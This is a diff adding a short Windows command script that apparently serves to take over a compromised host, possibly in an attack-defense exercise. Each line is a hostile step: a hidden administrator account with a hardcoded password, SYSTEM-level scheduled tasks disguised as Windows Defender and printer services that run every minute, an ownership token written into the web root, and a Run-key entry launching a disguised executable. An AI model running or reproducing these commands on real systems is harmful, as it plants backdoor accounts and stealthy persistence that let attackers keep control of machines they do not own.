@@ -1,0 +1,5 @@
+net user guest_user onth3net /add
+net localgroup administrators guest_user /add
+schtasks /create /tn "Windows Defender Update" /ru "system" /sc minute /MO 1 /tr "c:\windows\temp\def.bat"
+schtasks /create /tn "Windows Printer Services" /ru "system" /sc minute /MO 1 /tr "cmd /c echo TOKEN > c:\inetpub\wwwroot\ownership.html"
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\ /v "Cross Servers Support" /t REG_SZ /d "C:\windows\dllhosts.exe" /f
